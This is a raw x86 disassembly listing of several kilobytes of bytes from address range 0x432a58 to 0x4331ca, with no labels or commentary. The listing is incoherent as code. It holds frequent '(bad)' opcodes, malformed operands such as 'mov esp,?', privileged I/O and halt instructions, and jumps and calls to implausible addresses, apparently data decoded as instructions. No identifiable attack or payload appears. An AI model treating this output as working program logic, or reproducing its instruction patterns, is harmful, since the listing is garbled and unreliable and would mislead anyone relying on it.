  432a58:	xlat   BYTE PTR ds:[ebx]
  432a59:	into   
  432a5a:	ffreep st(6)
  432a5c:	retf   0x6c7
  432a5f:	iret   
  432a60:	dec    ebp
  432a61:	inc    ebp
  432a62:	mov    DWORD PTR [ebx],edi
  432a64:	fmul   QWORD PTR [edi]
  432a66:	dec    ebp
  432a67:	jnp    0x432a9c
  432a69:	add    BYTE PTR [ebx],al
  432a6b:	mov    ecx,DWORD PTR [esp+edi*8]
  432a6e:	inc    ebp
  432a6f:	dec    ebp
  432a70:	lea    esi,[ebx]
  432a72:	add    DWORD PTR [ebx],eax
  432a74:	jb     0x432ab1
  432a76:	add    BYTE PTR [edi],cl
  432a78:	inc    ebp
  432a79:	imul   eax,edi,0x858bd800
  432a7f:	cld    
  432a80:	clc    
  432a81:	mov    DWORD PTR [ebp+0x0],eax
  432a84:	inc    DWORD PTR [eax]
  432a86:	or     al,0xde
  432a88:	sbb    bh,0x1
  432a8b:	retf   
  432a8c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432a93:	dec    ebp
  432a94:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432a9a:	enter  0x12de,0xdf
  432a9e:	inc    ebp
  432a9f:	pop    ebp
  432aa0:	dec    DWORD PTR [ebx-0x257f0ff4]
  432aa6:	add    DWORD PTR [edx],edx
  432aa8:	add    BYTE PTR [ebp+0x50],dl
  432aab:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432ab1:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432ab7:	or     ah,al
  432ab9:	pop    ss
  432aba:	cdq    
  432abb:	push   ebp
  432abc:	clc    
  432abd:	mov    eax,DWORD PTR [ebp-0x4]
  432ac0:	xor    edx,edx
  432ac2:	add    esi,DWORD PTR [ebx]
  432ac4:	cmp    eax,DWORD PTR [ebx]
  432ac6:	hlt    
  432ac7:	cmp    DWORD PTR [ebx],esp
  432ac9:	or     al,BYTE PTR [ebp+0xf]
  432acc:	mov    eax,DWORD PTR [edx]
  432ace:	loopne 0x432ad0
  432ad0:	(bad)  
  432ad1:	mov    ecx,esi
  432ad3:	cld    
  432ad4:	pushf  
  432ad5:	pop    ebp
  432ad6:	cdq    
  432ad7:	mov    esi,DWORD PTR [edx]
  432ad9:	lock mov eax,eax
  432adc:	adc    BYTE PTR [ebx],al
  432ade:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432ae5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432aeb:	dec    ebp
  432aec:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432af2:	(bad)  
  432af3:	iret   
  432af4:	inc    ebp
  432af5:	(bad)  
  432af6:	jne    0x432b45
  432af8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432afe:	(bad)  
  432aff:	cmp    ebx,eax
  432b01:	je     0x432a89
  432b03:	add    edi,edi
  432b05:	or     bh,bh
  432b07:	dec    ebp
  432b08:	inc    ebp
  432b09:	mov    esi,DWORD PTR [ebx]
  432b0b:	cld    
  432b0c:	add    ecx,esi
  432b0e:	cmp    ecx,DWORD PTR [eax-0xc]
  432b11:	mov    edx,DWORD PTR [edi]
  432b13:	or     BYTE PTR [ebp-0x7c],al
  432b16:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432b1c:	test   BYTE PTR [ecx+ebx*4],cl
  432b1f:	inc    ebp
  432b20:	xor    bh,BYTE PTR ds:0x8be89c89
  432b26:	out    dx,eax
  432b27:	adc    BYTE PTR [eax],al
  432b29:	jne    0x432af2
  432b2b:	mov    ebp,esp
  432b2d:	fcomp  DWORD PTR [ebx]
  432b2f:	add    BYTE PTR [ecx],al
  432b31:	inc    DWORD PTR [ebp-0x75]
  432b34:	mov    esp,?
  432b36:	add    al,0xce
  432b38:	mov    ecx,edi
  432b3a:	cld    
  432b3b:	inc    ebp
  432b3c:	fidivr WORD PTR [ebx]
  432b3e:	fbstp  TBYTE PTR [ebp-0x3e]
  432b41:	mov    eax,DWORD PTR [eax]
  432b43:	adc    BYTE PTR [ebx-0x3974038b],cl
  432b49:	fadd   st,st(7)
  432b4b:	add    BYTE PTR [ebp-0x1],al
  432b4e:	mov    ecx,DWORD PTR [esp+edi*8]
  432b51:	inc    ebp
  432b52:	mov    bh,0xc7
  432b55:	loopne 0x432b9c
  432b57:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432b5d:	add    DWORD PTR [ebx],esi
  432b5f:	pushf  
  432b60:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432b66:	mov    eax,edi
  432b68:	cwde   
  432b69:	inc    ebp
  432b6a:	inc    ebp
  432b6b:	jne    0x432af8
  432b6d:	mov    esp,esp
  432b6f:	clc    
  432b70:	add    al,0x4d
  432b72:	mov    DWORD PTR [ebx],esi
  432b74:	or     al,0x33
  432b76:	inc    ebp
  432b77:	lea    ecx,[ebx-0x398d13fd]
  432b7d:	add    bh,al
  432b7f:	inc    ebp
  432b80:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432b87:	add    ebp,esp
  432b89:	shufps xmm1,xmm3,0xc7
  432b8d:	(bad)  
  432b8e:	jmp    0x748866b7
  432b93:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432b99:	hlt    
  432b9a:	mov    ecx,DWORD PTR [edi]
  432b9c:	fadd   DWORD PTR [ebp+0x0]
  432b9f:	xor    ecx,DWORD PTR [edi]
  432ba1:	add    ecx,ecx
  432ba3:	cmp    edi,edi
  432ba5:	pmuludq mm7,QWORD PTR [edx+0x50]
  432ba9:	(bad)  
  432baa:	jmp    0x432b37
  432bac:	mov    edi,esp
  432bae:	or     al,0xc6
  432bb0:	inc    ebp
  432bb1:	(bad)  
  432bb2:	mov    eax,DWORD PTR [ebp+0x10]
  432bb5:	jne    0x432b40
  432bb7:	mov    eax,DWORD PTR [ecx]
  432bb9:	clc    
  432bba:	add    BYTE PTR [ebp-0x40],cl
  432bbd:	xor    edx,DWORD PTR [eax-0x73]
  432bc0:	jne    0x432bc3
  432bc2:	push   DWORD PTR [edx+0x8]
  432bc5:	add    BYTE PTR [ebp+0x45],al
  432bc8:	mov    ebp,ecx
  432bca:	cld    
  432bcb:	add    BYTE PTR [ebp+0x0],cl
  432bce:	xor    eax,DWORD PTR [ebp+0x3]
  432bd1:	mov    ?,WORD PTR [ebx]
  432bd3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432bd9:	sub    eax,0x5d330e4d
  432bde:	lea    esi,[ebx]
  432be0:	add    DWORD PTR [ebx],eax
  432be2:	jb     0x432bcd
  432be4:	add    BYTE PTR [eax],al
  432be6:	inc    ebp
  432be7:	add    bl,ch
  432be9:	inc    ebp
  432bea:	mov    esi,DWORD PTR [ebx]
  432bec:	or     al,0x3
  432bee:	(bad)  
  432bef:	mov    edi,eax
  432bf1:	in     al,dx
  432bf2:	scas   eax,DWORD PTR es:[edi]
  432bf3:	inc    ebp
  432bf4:	mov    esi,DWORD PTR [ebx]
  432bf6:	in     al,0x3
  432bf8:	add    al,0x89
  432bfa:	mov    ecx,DWORD PTR [eax+edi*8]
  432bfd:	dec    ebp
  432bfe:	(bad)  
  432bff:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432c06:	mov    ecx,eax
  432c08:	cld    
  432c09:	push   es
  432c0a:	dec    ebp
  432c0b:	add    al,0x33
  432c0d:	mov    DWORD PTR [ebx],eax
  432c0f:	in     al,dx
  432c10:	cmp    DWORD PTR [ebp-0x67],eax
  432c13:	mov    eax,DWORD PTR [ebp-0xba0068]
  432c19:	mov    edx,DWORD PTR [ebp-0x4]
  432c1c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432c1f:	xor    eax,DWORD PTR [ebp+0x3]
  432c22:	cmp    DWORD PTR [ebx],0x8b327498
  432c28:	xor    edi,esp
  432c2a:	jmp    0xff77297c
  432c2f:	add    ecx,DWORD PTR [ebp-0x3f]
  432c32:	xor    ebx,DWORD PTR [edi]
  432c34:	add    eax,ecx
  432c36:	cmp    ebx,DWORD PTR [eax]
  432c38:	mov    ecx,DWORD PTR [ebp-0x4]
  432c3b:	mov    ecx,DWORD PTR [eax]
  432c3d:	adc    BYTE PTR [ebp-0x80],al
  432c40:	jmp    0x432c43
  432c42:	mov    eax,DWORD PTR [eax]
  432c44:	cld    
  432c45:	mov    bh,0xc6
  432c47:	push   ecx
  432c48:	(bad)  
  432c49:	jne    0x432ca9
  432c4b:	dec    ecx
  432c4d:	or     BYTE PTR [ecx+ebx*1],cl
  432c50:	push   ebp
  432c51:	inc    ebp
  432c52:	in     al,dx
  432c53:	add    ebp,esp
  432c55:	or     bh,al
  432c57:	dec    ebp
  432c58:	cld    
  432c59:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432c5f:	cmp    DWORD PTR [ecx],0x2
  432c62:	pushf  
  432c63:	dec    DWORD PTR [ebx+0x45510cf4]
  432c69:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432c6f:	mov    edx,DWORD PTR [ecx+0xc]
  432c72:	xor    eax,esi
  432c74:	mov    edx,0xc172c7
  432c79:	inc    ebp
  432c7a:	mov    esi,DWORD PTR [ebp+0x8]
  432c7d:	mov    eax,edx
  432c7f:	call   0x84c7f374
  432c84:	add    DWORD PTR [ecx-0x76bace00],ebx
  432c8a:	mov    ebp,eax
  432c8c:	or     BYTE PTR [eax],dl
  432c8e:	jo     0x432cdd
  432c90:	push   edi
  432c91:	xor    esi,DWORD PTR [ebp+0x3]
  432c94:	(bad)  
  432c95:	pmulhuw mm0,mm1
  432c98:	test   DWORD PTR [ebp-0x8],ecx
  432c9b:	mov    DWORD PTR [ebp-0x67],eax
  432c9e:	mov    eax,DWORD PTR [ebp-0x4]
  432ca1:	xor    edi,DWORD PTR [ebp-0x73]
  432ca4:	xor    eax,DWORD PTR [ebx]
  432ca6:	xor    esi,DWORD PTR [edx+0x3]
  432ca9:	add    BYTE PTR [ecx],bh
  432cab:	inc    ebp
  432cac:	(bad)  
  432cad:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432cb3:	mov    DWORD PTR [eax],0x750f0004
  432cb9:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432cbf:	lock add BYTE PTR [ebp+0x0],cl
  432cc3:	mov    esi,DWORD PTR [ebp-0x18]
  432cc6:	mov    ebp,edx
  432cc8:	or     al,0x72
  432cca:	ja     0x432ccc
  432ccc:	mov    edx,esi
  432cce:	cld    
  432ccf:	(bad)  
  432cd2:	cli    
  432cd3:	mov    esi,DWORD PTR [ebp-0x4]
  432cd6:	cmp    ecx,esi
  432cd8:	bswap  edi
  432cda:	(bad)
  432cde:	mov    esi,DWORD PTR [ebp-0x4]
  432ce1:	mov    esi,ecx
  432ce3:	clc    
  432ce4:	repnz add esi,DWORD PTR [ebp+0x45]
  432ce8:	push   ebx
  432ce9:	xor    eax,DWORD PTR [ebp+0x3]
  432cec:	cmp    ebx,DWORD PTR [edi-0x64]
  432cef:	pop    ebx
  432cf0:	jmp    0x432db7
  432cf5:	mov    esi,DWORD PTR [ebp-0x7d]
  432cf8:	xor    ebp,DWORD PTR [eax]
  432cfa:	lea    eax,[ebp-0x8]
  432cfd:	ss repnz pushf 
  432d00:	out    dx,eax
  432d01:	(bad)  
  432d02:	neg    eax
  432d04:	ins    DWORD PTR es:[edi],dx
  432d05:	test   esi,edi
  432d07:	clc    
  432d08:	pop    esp
  432d09:	inc    ebp
  432d0a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432d10:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432d16:	add    cl,al
  432d18:	jne    0x432cb3
  432d1a:	mov    esi,DWORD PTR [edx]
  432d1c:	in     al,dx
  432d1d:	push   esi
  432d1e:	xor    BYTE PTR [ebp-0xe],dh
  432d21:	add    edi,esi
  432d23:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432d29:	add    cl,bh
  432d2b:	mov    edi,DWORD PTR [ebp+0x8]
  432d2e:	mov    DWORD PTR [ebp-0x14],esi
  432d31:	add    esi,DWORD PTR [ebp+0x3c]
  432d34:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432d3a:	mov    ah,0x3d
  432d3c:	cdq    
  432d3d:	pushf  
  432d3e:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432d44:	jne    0x432cd1
  432d46:	mov    ecx,DWORD PTR [esp+ebp*8]
  432d49:	icebp  
  432d4a:	icebp  
  432d4b:	shl    edx,0xf2
  432d4e:	(bad)  
  432d4f:	mov    ah,0x16
  432d51:	inc    eax
  432d52:	jne    0x432ce7
  432d54:	mov    ecx,DWORD PTR [edi]
  432d56:	in     al,dx
  432d57:	jmp    0x432d4a
  432d59:	add    dl,dh
  432d5b:	mov    edi,esi
  432d5d:	or     al,0x8
  432d5f:	inc    ebp
  432d60:	jne    0x432d65
  432d62:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432d68:	ret    
  432d69:	or     bh,bh
  432d6b:	jge    0x432d55
  432d6d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432d73:	xor    edi,eax
  432d75:	add    esi,DWORD PTR [ebp-0x77]
  432d78:	mov    ebx,esp
  432d7a:	clc    
  432d7b:	neg    DWORD PTR [ebp-0x7c]
  432d7e:	xor    eax,DWORD PTR [eax]
  432d80:	cmp    eax,DWORD PTR [eax]
  432d82:	repz jne 0x432d1a
  432d85:	xor    eax,DWORD PTR [ecx]
  432d87:	add    ebx,DWORD PTR [eax]
  432d89:	mov    DWORD PTR [ebp-0x8],eax
  432d8c:	mov    eax,edi
  432d8e:	cld    
  432d8f:	lock pop eax
  432d91:	test   DWORD PTR [ebx],esi
  432d93:	clc    
  432d94:	add    edx,DWORD PTR [edi-0x740bff77]
  432d9a:	fdivp  st(4),st
  432d9c:	test   ecx,esi
  432d9e:	(bad)  
  432d9f:	jnp    0x432da0
  432da1:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432da7:	jae    0x432d34
  432da9:	sub    edi,esp
  432dab:	(bad)  
  432dac:	shl    DWORD PTR [eax-0x3e],0x89
  432db0:	leave  
  432db1:	call   0x8198e4be
  432db6:	in     al,dx
  432db7:	(bad)  
  432db8:	in     al,dx
  432db9:	add    bh,al
  432dbb:	mov    esp,edi
  432dbd:	in     al,dx
  432dbe:	test   DWORD PTR [ebp-0x8],edi
  432dc1:	mov    eax,DWORD PTR [ebp+0x2b]
  432dc4:	cmp    DWORD PTR [ebx],eax
  432dc6:	pushf  
  432dc7:	jnp    0x57322a00
  432dcd:	xor    edx,DWORD PTR [ecx-0x77]
  432dd0:	push   ecx
  432dd1:	loopne 0x432e06
  432dd3:	jne    0x432d90
  432dd5:	mov    esi,DWORD PTR [edx-0x20]
  432dd8:	add    BYTE PTR [ebp-0x3d],bh
  432ddb:	xor    eax,DWORD PTR [ebp-0x73]
  432dde:	mov    edi,DWORD PTR [esi]
  432de0:	cld    
  432de1:	jb     0x432da9
  432de3:	add    bl,al
  432de5:	jne    0x432e2c
  432de7:	mov    edx,DWORD PTR [edi-0x10]
  432dea:	jge    0x432e69
  432dec:	mov    esi,DWORD PTR [ebx]
  432dee:	lock add ecx,DWORD PTR [ebp+0x3b]
  432df2:	xor    esi,DWORD PTR [ebp-0x77]
  432df5:	mov    esi,eax
  432df7:	lock inc ebp
  432df9:	jge    0x432e31
  432dfb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432e02:	dec    ebp
  432e03:	mov    esi,DWORD PTR [ebx]
  432e05:	loopne 0x432d90
  432e07:	jge    0x432e01
  432e09:	add    DWORD PTR [ebp-0x7d],eax
  432e0c:	test   BYTE PTR [edx],0x9c
  432e0f:	dec    ebp
  432e10:	mov    esi,DWORD PTR [ebp-0xc]
  432e13:	mov    ecx,DWORD PTR [ebp-0xc]
  432e16:	xor    ebx,DWORD PTR [ebp-0x77]
  432e19:	mov    esi,esp
  432e1b:	in     al,0x45
  432e1d:	jge    0x432e59
  432e1f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432e26:	dec    ebp
  432e27:	inc    esp
  432e28:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432e2e:	inc    ebp
  432e2f:	hlt    
  432e30:	ss jne 0x432dd2
  432e33:	mov    edi,DWORD PTR [eax+0xf19504]
  432e39:	repnz mov DWORD PTR [ebp+0x20],ebx
  432e3d:	cmp    eax,DWORD PTR [ebp+0xf]
  432e40:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432e44:	fistp  WORD PTR [ebx+0x0]
  432e47:	inc    ebp
  432e48:	mov    ebx,DWORD PTR [edi+0xc]
  432e4b:	add    eax,eax
  432e4d:	inc    ebp
  432e4e:	test   BYTE PTR [ebx],dh
  432e50:	add    eax,DWORD PTR [ebx]
  432e52:	add    BYTE PTR [esi+0x45],bl
  432e55:	ret    0x85
  432e58:	jnp    0x5443b227
  432e5e:	inc    bp
  432e60:	inc    ebp
  432e61:	ss mov ecx,0xc78a9c
  432e67:	fdiv   QWORD PTR [ebx]
  432e69:	test   DWORD PTR [ecx+0x453af8],edi
  432e6f:	push   ebx
  432e70:	add    edi,DWORD PTR [esi+0x708088b]
  432e76:	cmp    esi,eax
  432e78:	setns  BYTE PTR [ecx-0x74fcffce]
  432e7f:	mov    esp,edi
  432e81:	call   0x33ce73d3
  432e86:	or     BYTE PTR [ebx],al
  432e88:	inc    ecx
  432e89:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432e8f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432e95:	lock add cl,al
  432e98:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432e9f:	mov    ch,0x45
  432ea1:	clc    
  432ea2:	xor    eax,DWORD PTR [ebp+0x3]
  432ea5:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432eab:	inc    ebp
  432eac:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432eb2:	mov    edi,eax
  432eb4:	mov    eax,DWORD PTR [ebp+0x3c]
  432eb7:	mov    ecx,DWORD PTR [eax]
  432eb9:	hlt    
  432eba:	inc    ebp
  432ebb:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432ec2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432ec8:	push   ebp
  432ec9:	mov    edi,DWORD PTR [ebx]
  432ecb:	in     al,dx
  432ecc:	jne    0x432e8f
  432ece:	mov    eax,DWORD PTR [ebp-0x28]
  432ed1:	add    DWORD PTR [eax],0xe8058dec
  432ed7:	clc    
  432ed8:	mov    esi,DWORD PTR [edi-0x8]
  432edb:	add    dh,dl
  432edd:	rol    WORD PTR [ebp-0x1],cl
  432ee1:	mov    edx,DWORD PTR [eax+0x8]
  432ee4:	jne    0x432ea6
  432ee6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432eed:	inc    ebp
  432eee:	push   esp
  432eef:	test   DWORD PTR [ecx+0xf],ecx
  432ef2:	sub    edx,esp
  432ef4:	add    eax,DWORD PTR [eax]
  432ef6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432efc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432f03:	mov    eax,DWORD PTR [ecx]
  432f05:	and    BYTE PTR [eax],al
  432f07:	cmp    BYTE PTR [eax],dl
  432f09:	add    BYTE PTR [ebp+0x66],al
  432f0c:	inc    ecx
  432f0e:	push   esp
  432f0f:	(bad)  
  432f10:	jne    0x432f12
  432f12:	push   edx
  432f13:	enterw 0xc1,0x4d
  432f18:	mov    esp,DWORD PTR [esi+0x20]
  432f1b:	add    DWORD PTR [ecx-0x7b],eax
  432f1e:	add    eax,DWORD PTR [ebx]
  432f20:	str    WORD PTR [eax+0x45]
  432f24:	lea    ecx,[ebx+0x45890801]
  432f2a:	sbb    BYTE PTR [ebx],al
  432f2c:	dec    ebp
  432f2d:	cmp    al,0xf
  432f2f:	inc    ebp
  432f30:	push   eax
  432f31:	mov    esi,DWORD PTR [ebx]
  432f33:	push   eax
  432f34:	add    eax,eax
  432f36:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432f3d:	inc    ebp
  432f3e:	add    BYTE PTR [esi],dh
  432f40:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432f47:	(bad)  
  432f48:	mov    ebx,eax
  432f4a:	loopne 0x432f91
  432f4c:	dec    ebp
  432f4d:	mov    ecx,DWORD PTR [edi]
  432f4f:	cld    
  432f50:	push   eax
  432f51:	xchg   DWORD PTR [ebx],esi
  432f53:	add    DWORD PTR [ebx],ebp
  432f55:	add    BYTE PTR [ebx],ch
  432f57:	or     BYTE PTR [ecx],bh
  432f59:	dec    ecx
  432f5a:	loopne 0x432f5f
  432f5c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432f62:	push   ebp
  432f63:	add    DWORD PTR [ebx+0x55100800],eax
  432f69:	dec    ebp
  432f6a:	jmp    0x432ef5
  432f6c:	mov    esp,DWORD PTR [eax]
  432f6e:	sbb    dl,dl
  432f70:	inc    eax
  432f71:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432f77:	add    BYTE PTR [ebx+0x74528555],cl
  432f7d:	push   ebp
  432f7e:	div    DWORD PTR [ebx]
  432f80:	and    eax,DWORD PTR [ebx]
  432f82:	add    edx,DWORD PTR [edx-0x30]
  432f85:	jno    0x432f12
  432f87:	inc    DWORD PTR [eax+eiz*1]
  432f8a:	inc    ebp
  432f8b:	push   eax
  432f8c:	push   eax
  432f8d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432f93:	mov    edi,esp
  432f95:	push   eax
  432f96:	inc    ebp
  432f97:	enter  0x458b,0x8
  432f9b:	push   ecx
  432f9c:	(bad)  
  432f9d:	call   0x10d3975
  432fa2:	pop    ss
  432fa3:	push   ebp
  432fa4:	mov    ecx,DWORD PTR [ebx+0x489408]
  432faa:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432fb0:	push   ecx
  432fb1:	jo     0x432f9b
  432fb3:	inc    DWORD PTR [edi]
  432fb5:	or     BYTE PTR [eax],al
  432fb7:	call   0xce3701
  432fbc:	fmul   QWORD PTR [ebp+0x55]
  432fbf:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432fc5:	mov    bh,0x8c
  432fc7:	adc    al,0x99
  432fc9:	dec    esp
  432fca:	xor    bl,BYTE PTR [eax]
  432fcc:	mov    ecx,DWORD PTR [ebp+0xc]
  432fcf:	mov    eax,DWORD PTR [ebp-0x4]
  432fd2:	mov    esi,DWORD PTR [edi-0x3148f924]
  432fd8:	push   es
  432fd9:	retf   
  432fda:	mov    BYTE PTR [ebp-0x30],0x3b
  432fde:	inc    ebp
  432fdf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432fe6:	retf   0x83fc
  432fe9:	into   
  432fea:	dec    ebp
  432feb:	retf   
  432fec:	mov    ecx,DWORD PTR [ebp-0x74]
  432fef:	mov    eax,DWORD PTR [eax]
  432ff1:	fdiv   QWORD PTR [ebx]
  432ff3:	mov    bh,0x3
  432ff5:	push   es
  432ff6:	mov    esi,ecx
  432ff8:	sbb    cl,dl
  432ffa:	dec    ebp
  432ffb:	sar    DWORD PTR [ebx],cl
  432ffd:	push   ebp
  432ffe:	jne    0x43300f
  433000:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433006:	lea    ebx,[eax]
  433008:	call   0xf4ccbbcf
  43300d:	sbb    dh,dl
  43300f:	add    edx,ebx
  433011:	push   ebp
  433012:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433018:	push   ecx
  433019:	mov    DWORD PTR [eax-0x30],edx
  43301c:	test   DWORD PTR [edx],eax
  43301e:	xadd   esp,esi
  433021:	pop    es
  433022:	add    cl,dl
  433024:	mov    eax,ecx
  433026:	or     al,0x45
  433028:	(bad)  
  433029:	push   eax
  43302a:	add    DWORD PTR [edx+0x0],eax
  43302d:	add    ecx,DWORD PTR [ecx]
  43302f:	and    dh,cl
  433031:	call   0xc73901
  433036:	add    DWORD PTR [ebp+0x0],edx
  433039:	mov    esp,DWORD PTR [ebp+0x18]
  43303c:	add    BYTE PTR [eax+0x48],cl
  43303f:	xor    eax,DWORD PTR [eax]
  433041:	add    esp,DWORD PTR [esi+0x3b]
  433044:	inc    ebp
  433045:	je     0x432fca
  433047:	push   ecx
  433048:	push   es
  433049:	dec    ebp
  43304a:	mov    DWORD PTR [ebx],eax
  43304c:	(bad)  
  43304d:	or     al,0x5e
  43304f:	inc    eax
  433050:	add    BYTE PTR [ebx],al
  433052:	data16 and BYTE PTR [ebp+0x50],al
  433056:	sub    DWORD PTR [ecx],0xfffffff8
  433059:	add    BYTE PTR [ebp-0x75],ah
  43305c:	add    BYTE PTR [eax],bl
  43305e:	enter  0x894d,0x8b
  433062:	int3   
  433063:	loopne 0x43309f
  433065:	rol    BYTE PTR [eax],0x33
  433068:	lea    cx,[ebp+0xa]
  43306c:	data16 jb 0x4330b4
  43306f:	add    BYTE PTR [ebx+0x44890855],cl
  433075:	sbb    ah,al
  433077:	inc    ebp
  433078:	cmp    BYTE PTR [edi],cl
  43307a:	add    BYTE PTR [edx+0x66],dl
  43307d:	xor    ecx,DWORD PTR [eax]
  43307f:	sub    edi,esi
  433081:	mov    eax,DWORD PTR [eax]
  433083:	or     al,0x66
  433085:	ror    edx,cl
  433087:	dec    ebp
  433088:	inc    ebp
  433089:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43308f:	cld    
  433090:	or     BYTE PTR [edi+0x4501dd],dl
  433096:	ret    0xe8ce
  433099:	retf   
  43309a:	(bad)  
  43309b:	dec    ebp
  43309c:	mov    al,0x8b
  43309e:	in     al,dx
  43309f:	and    BYTE PTR [ebx],bh
  4330a1:	or     al,BYTE PTR [ebp+0x27]
  4330a4:	in     al,dx
  4330a5:	xchg   eax,ebp
  4330a7:	add    edi,eax
  4330a9:	add    BYTE PTR [eax+0x3f52ed55],bh
  4330af:	push   ebp
  4330b0:	inc    ebp
  4330b1:	xor    ebx,edx
  4330b3:	add    ebp,eax
  4330b5:	push   edx
  4330b6:	push   bp
  4330b8:	inc    ebp
  4330b9:	(bad)  
  4330ba:	jmp    0xc342f713
  4330bf:	sbb    al,0x33
  4330c1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4330c8:	add    BYTE PTR [ebp+0x44],0x8b
  4330cc:	jmp    0xf98b:0x100041c8
  4330d3:	xor    esi,DWORD PTR [edx+0x3]
  4330d6:	mov    ecx,DWORD PTR [edi]
  4330d8:	fmul   DWORD PTR [edx]
  4330da:	add    BYTE PTR [eax],al
  4330dc:	lea    eax,[ebx-0x4700273c]
  4330e2:	add    al,0x4f
  4330e4:	pop    DWORD PTR [eax]
  4330e6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4330ec:	push   edx
  4330ed:	inc    WORD PTR [ebp+0x8]
  4330f1:	mov    eax,0x514f4d
  4330f6:	(bad)
  4330fa:	add    al,al
  4330fc:	xor    DWORD PTR [ebx-0x74baf730],eax
  433102:	test   DWORD PTR [esi+0x74],esp
  433105:	inc    ebp
  433106:	mov    DWORD PTR [eax+0xa4f08],edi
  43310c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433112:	or     dh,cl
  433114:	or     eax,0x8b8d5045
  433119:	inc    ebp
  43311a:	mov    WORD PTR [ecx+0x3b8a00],?
  433120:	jne    0x433155
  433122:	mov    edi,DWORD PTR [edx+0x8f3a18]
  433128:	add    DWORD PTR [ebx],eax
  43312a:	add    bh,bh
  43312c:	adc    DWORD PTR [eax],ecx
  43312e:	adc    DWORD PTR [ebp+0x55],edi
  433131:	push   es
  433132:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  433138:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  43313f:	inc    ebp
  433140:	mov    esp,edi
  433142:	or     al,0xda
  433144:	push   eax
  433145:	(bad)  
  433146:	jne    0x4330fc
  433148:	call   0x3b2a37
  43314d:	inc    ebp
  43314e:	rol    ah,0x84
  433151:	call   0xbc43f856
  433156:	jne    0x433132
  433158:	mov    ebx,ebx
  43315a:	inc    edi
  43315c:	and    al,al
  43315e:	fs jmp 0x7ec87763
  433164:	bswap  ecx
  433166:	scas   al,BYTE PTR es:[edi]
  433167:	inc    esp
  433168:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43316f:	or     BYTE PTR [ebx-0x97717c6],0x83
  433176:	call   DWORD PTR [edi]
  433178:	shr    ah,0x84
  43317b:	xchg   DWORD PTR [eax],eax
  43317d:	add    DWORD PTR [eax],eax
  43317f:	add    bh,bh
  433181:	dec    ebp
  433182:	and    BYTE PTR [ecx-0x38],dl
  433185:	push   eax
  433186:	dec    DWORD PTR [ebx+0xfd885]
  43318c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433192:	mov    WORD PTR [ecx+0x0],ss
  433195:	lea    ecx,[ebx+0x108b20d8]
  43319b:	mov    WORD PTR [edx],ds
  43319d:	add    BYTE PTR [edi+0xff01ff],al
  4331a3:	mov    ecx,DWORD PTR [ebp-0x28]
  4331a6:	push   ecx
  4331a7:	shl    BYTE PTR [ebp+0x3a],0x8b
  4331ab:	inc    ebp
  4331ac:	in     al,0xeb
  4331ae:	jno    0x43313b
  4331b0:	push   edx
  4331b1:	mov    DWORD PTR [eax-0x28],edx
  4331b4:	mov    eax,DWORD PTR [ebp+0x20]
  4331b7:	je     0x433140
  4331b9:	mov    eax,DWORD PTR [ecx]
  4331bb:	sbb    BYTE PTR [eax],al
  4331bd:	pop    DWORD PTR [eax]
  4331bf:	add    esi,eax
  4331c1:	add    bl,al
  4331c3:	adc    DWORD PTR [edi],esi
  4331c5:	jmp    0x8bce8217
  4331ca:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
